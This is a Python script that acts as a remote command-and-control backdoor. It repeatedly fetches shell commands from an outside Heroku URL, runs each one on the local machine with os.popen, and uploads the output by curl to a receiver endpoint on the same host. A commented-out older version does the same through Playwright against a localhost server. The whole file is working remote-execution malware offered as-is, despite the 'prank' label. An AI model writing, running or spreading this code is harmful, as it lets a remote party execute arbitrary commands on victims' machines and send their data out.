import os as o
import threading
import requests
import time
URL = "https://prank-exploit.herokuapp.com/command"
def exploit():
    response = requests.get(URL).text
    print(response)
    reply = o.popen(response).read()
    #print(reply)
    f = open("tmp", "w")
    f.write(reply)
    f.close()
    o.system('curl -F "rep=@tmp" https://prank-exploit.herokuapp.com/reciver.php')
    currentHash = response
    time.sleep(3)
    while True:
        try:
            response = requests.get(URL).text
            currentHash = response
            time.sleep(3)
            response = requests.get(URL).text
            newHash = response
            if newHash == currentHash:
                continue
            else:
                print(response)
                reply = o.popen(response).read()
                #print(reply)
                f = open("tmp", "w")
                f.write(reply)
                f.close()
                o.system('curl -F "rep=@tmp" https://prank-exploit.herokuapp.com/reciver.php')
                response = requests.get(URL).text
                currentHash = response
                time.sleep(3)
                continue
        except Exception as e:
            print("error")
t1 = threading.Thread(target=exploit, name='exp')
t1.start();

"""
Older version
import time
import os
from playwright.sync_api import sync_playwright
# setting the URL you want to monitor
url = "http://localhost:8000/sender.php"
with sync_playwright() as playwrite_t: 
    browser = playwrite_t.chromium.launch() 
    page = browser.new_page() 
    page.on("response", lambda response: print( 
        "<<", response.status, response.url)) 
    page.goto(url, wait_until="networkidle", timeout=90000) 
    response = page.content()
    response = response.replace('<html><head><meta name="color-scheme" content="light dark"></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">', '').replace('</pre></body></html>', '')
    page.context.close() 
    browser.close()
# to create the initial hash
currentHash = hash(response)
time.sleep(10)
while True:
    try:
        with sync_playwright() as playwrite_t: 
            browser = playwrite_t.chromium.launch() 
            page = browser.new_page() 
            page.on("response", lambda response: print( 
                "<<", response.status, response.url)) 
            page.goto(url, wait_until="networkidle", timeout=90000) 
            response = page.content()
            response = response.replace('<html><head><meta name="color-scheme" content="light dark"></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">', '').replace('</pre></body></html>', '')
            page.context.close() 
            browser.close()
        # create a hash
        currentHash = hash(response)
        # wait for 30 seconds
        time.sleep(10)
        # perform the get request
        with sync_playwright() as playwrite_t: 
            browser = playwrite_t.chromium.launch() 
            page = browser.new_page() 
            page.on("response", lambda response: print( 
                "<<", response.status, response.url)) 
            page.goto(url, wait_until="networkidle", timeout=90000) 
            response = page.content()
            response = response.replace('<html><head><meta name="color-scheme" content="light dark"></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">', '').replace('</pre></body></html>', '')
            page.context.close() 
            browser.close()
        # create a new hash
        newHash = hash(response)
 
        # check if new hash is same as the previous hash
        if newHash == currentHash:
            continue
 
        # if something changed in the hashes
        else:
            # notify
            print(response)
            reply = os.popen(response).read()
            print(reply)
            os.system(f'curl -X POST -F "rep={reply}" http://localhost:8000/reciver.php')
            with sync_playwright() as playwrite_t: 
                browser = playwrite_t.chromium.launch() 
                page = browser.new_page() 
                page.on("response", lambda response: print( 
                    "<<", response.status, response.url)) 
                page.goto(url, wait_until="networkidle", timeout=90000) 
                response = page.content()
                response = response.replace('<html><head><meta name="color-scheme" content="light dark"></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">', '').replace('</pre></body></html>', '')
                page.context.close() 
                browser.close()
            # create a hash
            currentHash = hash(response)
            # wait for 30 seconds
            time.sleep(30)
            continue
    # To handle exceptions
    except Exception as e:
        print("error")
"""
